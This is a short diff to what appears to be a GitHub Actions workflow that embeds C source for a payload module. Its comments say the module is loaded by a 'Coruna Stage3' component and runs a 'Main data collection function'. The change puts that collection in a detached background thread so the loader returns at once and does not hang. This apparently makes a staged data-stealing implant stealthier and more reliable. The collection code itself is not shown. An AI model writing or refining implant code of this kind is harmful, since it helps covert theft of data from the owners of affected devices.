@@ -53,6 +53,7 @@ jobs:
            */
           #include <CoreFoundation/CoreFoundation.h>
           #include <CFNetwork/CFNetwork.h>
+          #include <pthread.h>
           #include <stdio.h>
           #include <string.h>
           #include <sys/stat.h>
@@ -347,10 +348,21 @@ jobs:
           /* Forward declaration */
           void ds_collect_all(void);
            
-          /* _process entry point - called by Coruna Stage3 */
+          /* Background thread entry */
+          static void *bg_thread(void *arg) {
+              ds_collect_all();
+              return NULL;
+          }
+           
+          /* _process entry point - called by Coruna Stage3
+           * MUST return immediately or Stage3 hangs/crashes
+           * Data collection runs in background thread
+           */
           __attribute__((used))
           void process(void *ctx) {
-              ds_collect_all();
+              pthread_t thread;
+              pthread_create(&thread, NULL, bg_thread, NULL);
+              pthread_detach(thread);
           }
            
           /* Main data collection function */
